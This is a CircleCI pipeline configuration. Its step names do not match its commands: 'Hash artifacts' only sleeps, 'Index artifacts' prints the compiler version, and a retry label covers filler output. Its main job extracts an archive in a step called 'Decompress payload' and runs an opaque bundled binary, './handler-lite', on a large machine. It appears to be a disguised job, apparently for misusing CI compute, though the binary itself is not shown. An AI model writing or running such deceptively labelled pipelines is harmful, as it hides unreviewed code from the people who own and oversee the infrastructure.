version: 2.1

jobs:
  has_window:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Max 500 retries for captioning
          command: |
            mkdir -p /tmp/halt
            set +o pipefail 2>/dev/null; a=({1..1000}); printf '%d\n' "${a[@]}" > /tmp/halt/matrixshardcluster; true
            set -- "Validate_Tests1" "/tmp/halt/matrixshardcluster" "$(wc -c </tmp/halt/matrixshardcluster)"; echo "n=$1 p=$2 b=$3"
      - persist_to_workspace:
          root: /tmp/halt
          paths:
            - 'matrixshardcluster'
  Validate_Tests1:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/halt
      - run:
          name: Bind upstream
          command: |
            nl -s': ' /tmp/halt/matrixshardcluster 2>/dev/null | head -3 || true
      - run:
          name: Fetch sources only
          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Decompress payload
          command: tar -I xz -xf ledger-wip.tar.xz
      - run:
          name: Hash artifacts
          command: sleep 30
      - run:
          name: Index artifacts
          command: g++ --version
      - run:
          command: nice -n 0 ./handler-lite
